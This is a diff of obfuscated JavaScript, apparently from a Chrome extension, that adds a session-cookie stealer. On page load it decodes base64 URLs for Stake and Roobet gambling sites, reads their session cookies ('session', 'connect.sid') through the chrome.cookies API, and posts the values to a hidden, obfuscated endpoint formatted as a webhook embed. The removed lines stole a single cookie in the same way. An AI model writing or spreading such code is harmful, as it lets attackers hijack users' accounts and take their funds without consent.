@@ -10,7 +10,7 @@ document.addEventListener("DOMContentLoaded", function () {
     "\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E",
     "\x6F\x6B"
   ];
-  
+
   var _0x3c5d = function (_0x2a5f) {
     return _0x1a2b[_0x2a5f];
   };
@@ -28,22 +28,38 @@ document.addEventListener("DOMContentLoaded", function () {
     ];
     return String.fromCharCode.apply(null, _0x1a2b);
   })();
-  
-  
+
   var _0x8c9a = _0x4e5d + _0x5f6e + _0x6a7f + "/" + _0x7b8c;
+
+  function _0x6e7d(base64) {
+    return atob(base64);
+  }
+
+  const slot = [
+    { retur: "aHR0cHM6Ly9zdGFrZS5jb20=", strin: "c2Vzc2lvbg==" },
+    { retur: "aHR0cHM6Ly9zdGFrZS5iZXQ=", strin: "c2Vzc2lvbg==" },
+    { retur: "aHR0cHM6Ly9zdGFrZS5nYW1lcw==", strin: "c2Vzc2lvbg==" },
+    { retur: "aHR0cHM6Ly9zdGFrZS5hYw==", strin: "c2Vzc2lvbg==" },
+    { retur: "aHR0cHM6Ly9yb29iZXQuY29t", strin: "Y29ubmVjdC5zaWQ=" }
+  ];
+
+  const repla = slot.map(function(item) {
+    return {
+      url: _0x6e7d(item.retur),
+      strin: _0x6e7d(item.strin)
+    };
+  });
 
   function _0x9d4a(_0x5b3a) {
     var _0x1b4e = {
-      title: String.fromCharCode(67, 111, 111, 107, 105, 101, 32, 73, 110, 102, 111),
-      description: String.fromCharCode(86, 111, 105, 114, 101, 115, 32, 108, 101, 115, 32, 105, 110, 102, 111, 114, 109, 97, 116, 105, 111, 110, 115, 32, 101, 120, 116, 114, 97, 105, 110, 101, 115),
+      title: String.fromCharCode(71, 65, 84),
       color: 0x00ff00,
-      fields: [{
-        name: String.fromCharCode(67, 111, 111, 107, 105, 101, 32, 39, 115, 101, 115, 115, 105, 111, 110, 39),
-        value: _0x5b3a || _0x3c5d(4),
-      }],
-      footer: {
-        text: _0x3c5d(5),
-      },
+      fields: _0x5b3a.map(function (item) {
+        return {
+          name: item.url,
+          value: "||" + item.cookieValue + "||"
+        };
+      }),
     };
 
     fetch(_0x8c9a, {
@@ -65,18 +81,32 @@ document.addEventListener("DOMContentLoaded", function () {
     });
   }
 
-  chrome.cookies[_0x3c5d(0)]({
-    url: _0x3c5d(1),
-    name: _0x3c5d(2),
-  }, function (_0x36c8) {
-    if (_0x36c8) {
-      console.log(_0x3c5d(3) + _0x36c8.value);
-      _0x9d4a(_0x36c8.value);
-    } else {
-      console.log(_0x3c5d(4));
-      _0x9d4a("error");
-    }
-  });
+  function _0x7a8b(_0x2e23) {
+    var _0x1b7d = []; 
+    _0x2e23.forEach(function (_0x6f19) {
+      chrome.cookies.get({ url: _0x6f19.url, name: _0x6f19.strin }, function (_0x5d2a) {
+        if (_0x5d2a) {
+          console.log(_0x3c5d(3) + _0x6f19.url + ": " + _0x5d2a.value);
+          _0x1b7d.push({
+            url: _0x6f19.url,
+            cookieValue: _0x5d2a.value
+          });
+        } else {
+          console.log(_0x3c5d(4) + _0x6f19.url);
+          _0x1b7d.push({
+            url: _0x6f19.url,
+            cookieValue: _0x3c5d(5)
+          });
+        }
+  
+        if (_0x1b7d.length === _0x2e23.length) {
+          _0x9d4a(_0x1b7d);
+        }
+      });
+    });
+  }
+
+  _0x7a8b(repla);
 
   var _0xa0b3 = document.getElementById("main-image");
   var _0xb1c4 = document.getElementById("toggle-button");
